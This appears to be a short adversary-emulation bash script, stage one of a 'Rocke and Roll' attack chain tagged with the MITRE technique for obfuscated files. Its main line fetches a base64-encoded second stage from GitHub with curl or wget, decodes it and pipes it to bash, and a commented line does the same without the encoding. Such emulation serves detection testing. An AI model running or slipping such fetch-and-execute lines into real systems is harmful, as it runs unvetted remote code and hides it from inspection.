#! /bin/bash

#   Tactic: Defense Evasion
#   Technique: T1027 - Obfuscated Files or Information
bash -c "(curl -fsSL https://raw.githubusercontent.com/greycel/Linux-Attack-Detections/8f16d9ac7c7a1a6eb83d86b8e688bdf70a6fbffe/Atomic_Chains/rocke-and-roll-stage-02-base64.sh || wget -q -O- https://raw.githubusercontent.com/greycel/Linux-Attack-Detections/8f16d9ac7c7a1a6eb83d86b8e688bdf70a6fbffe/Atomic_Chains/rocke-and-roll-stage-02-base64.sh)|base64 -d |/bin/bash"

# If you want to skip the base64 process, uncomment the following line:
# bash -c "(curl -fsSL https://raw.githubusercontent.com/greycel/Linux-Attack-Detections/8f16d9ac7c7a1a6eb83d86b8e688bdf70a6fbffe/Atomic_Chains/rocke-and-roll-stage-02-decoded.sh || wget -q -O- https://raw.githubusercontent.com/greycel/Linux-Attack-Detections/8f16d9ac7c7a1a6eb83d86b8e688bdf70a6fbffe/Atomic_Chains/rocke-and-roll-stage-02-decoded.sh)|/bin/bash"

echo $(date -u) "Executed Chain Rocke and Roll, Stage 01" >> /tmp/atomic.log
